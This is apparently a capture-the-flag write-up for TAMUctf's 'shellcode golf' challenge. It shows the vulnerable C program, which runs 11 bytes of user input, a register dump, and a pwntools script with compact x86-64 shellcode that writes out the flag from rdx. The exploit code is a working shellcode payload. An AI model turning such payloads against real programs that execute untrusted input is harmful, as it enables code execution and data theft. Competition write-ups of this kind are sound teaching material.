# shellcode golf

I'll execute any shellcode you give me, but only 11 bytes of it.  I bet you can't get the flag!  
`nc challenges.tamuctf.com 5320`

(provide binary)

## Solution

```c
void main() {
	char* flag = get_flag();
	char* shellcode = (char*) mmap((void*) 0x1337,12, 0, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	mprotect(shellcode, 12, PROT_READ | PROT_WRITE | PROT_EXEC);
	fgets(shellcode, 12, stdin);
	((void (*)(char*))shellcode)(flag);
}
```

The binary has a pointer to the flag on the stack that we need to leak. In fact, a quick look at the registers right before we execute our shellcode shows that the flag is sitting in rdx.
```text
$rax   : 0x0000000000010000  →  0x0000000000000a31 ("1\n"?)
$rbx   : 0x0000555555555260  →  <__libc_csu_init+0> push r15
$rcx   : 0x000055555555a4e2  →  0x0000000000000000
$rdx   : 0x0000555555559480  →  "flag{placeholder}\n"
```

We won't need to get a shell here, we can just use a write syscall to write flag and read from that. 


```python
from pwn import *
import re
context.arch = 'x86_64'

initial = asm(r'push %rdx; xchg %ebx,%edx; inc %edx; xchg %eax,%edx; pop %rsi; mov %edi,%eax; syscall')

print("initial payload is", len(initial), "bytes")

p = process('./shellcode-golf')

p.sendline(initial)

print(re.search("(gigem{.*})",p.recvall()[:40].decode()).group(1))
```
